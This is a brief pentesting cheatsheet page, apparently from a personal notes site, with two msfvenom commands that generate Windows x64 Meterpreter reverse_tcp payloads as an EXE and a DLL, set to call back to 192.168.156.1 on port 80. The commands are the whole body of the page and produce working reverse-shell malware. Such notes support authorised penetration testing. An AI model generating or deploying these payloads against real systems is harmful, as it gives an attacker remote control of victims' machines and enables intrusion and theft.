---
layout: post
title: Generating MSFVENOM payloads
category: Pentesting
parent: Pentesting
grand_parent: Cheatsheets
modified_date: 2021-02-06
parent: Pentesting
permalink: /:categories/:title/
---

```sh
#? generate msfvenom payloads
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.156.1 lport=80 -f exe > /tmp/meter-rtcp-192.168.156.1-80.exe
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.156.1 lport=80 -f dll > /tmp/meter-rtcp-192.168.156.1-80.dll
```












